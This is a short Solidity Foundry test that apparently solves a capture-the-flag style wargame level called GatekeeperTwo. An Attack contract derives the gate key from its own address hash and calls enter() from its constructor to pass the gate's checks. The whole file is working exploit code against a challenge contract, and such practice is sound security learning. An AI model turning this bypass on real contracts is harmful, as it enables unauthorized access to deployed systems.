// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/Gatekeeper.sol";

contract AttackTest is Test {
    GatekeeperTwo public gate = GatekeeperTwo(0xC7c551d3704eB7612330D045F2d3B42240B7bD28);

    function testAttack() public {
        console.log(gate.entrant());
        new Attack();
        console.log(gate.entrant());

        assertTrue(gate.entrant() != address(0));
    }
}

contract Attack {
    GatekeeperTwo public gate = GatekeeperTwo(0xC7c551d3704eB7612330D045F2d3B42240B7bD28);

    constructor() {
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gate.enter(key);
    }
}
